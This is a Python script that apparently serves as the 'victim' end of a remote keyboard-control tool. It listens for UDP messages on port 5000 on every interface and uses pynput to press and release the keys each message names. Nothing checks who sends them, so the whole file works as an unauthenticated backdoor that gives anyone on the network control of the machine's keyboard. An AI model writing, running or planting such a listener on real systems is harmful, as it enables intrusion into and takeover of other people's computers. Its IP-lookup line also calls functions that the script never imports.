from socket import socket, gethostbyname, AF_INET, SOCK_DGRAM
from pynput.keyboard import Controller, Key
import json
import sys

# Set up server listen for input instructions
PORT_NUMBER = 5000
SIZE = 1024
try:
    # Find IP address of this machine
    # https://stackoverflow.com/a/1267524
    SERVER_IP   = [l for l in ([ip for ip in gethostbyname_ex(gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket(AF_INET, SOCK_DGRAM)]][0][1]]) if l][0][0]

except:
    # hardcode...
    SERVER_IP   = '192.168.1.104'

hostName = gethostbyname( '0.0.0.0' )

msg_socket = socket( AF_INET, SOCK_DGRAM )
msg_socket.bind( (hostName, PORT_NUMBER) )

# keyboard controller
keyboard = Controller()
print("Victim is listening on {0}:{1}".format(SERVER_IP, PORT_NUMBER))

def get_key_enum(key):
    key_name = key.split('.')[1]
    return getattr(Key, key_name)

while True:
    (data,addr) = msg_socket.recvfrom(SIZE)
    data = data.decode('utf-8')
    print(data)
    # data is in form: {key} {type}
    # e.g. 'a' pressed
    res = data.split(' ')
    print(res)
    if res[1] == 'released':
        try:
            keyboard.release(res[0])
        except ValueError:
            key_obj = get_key_enum(res[0])
            keyboard.release(key_obj)

    elif res[1] == 'pressed':
        try:
            keyboard.press(res[0])
        except ValueError:
            key_obj = get_key_enum(res[0])
            keyboard.press(key_obj)

sys.exit()
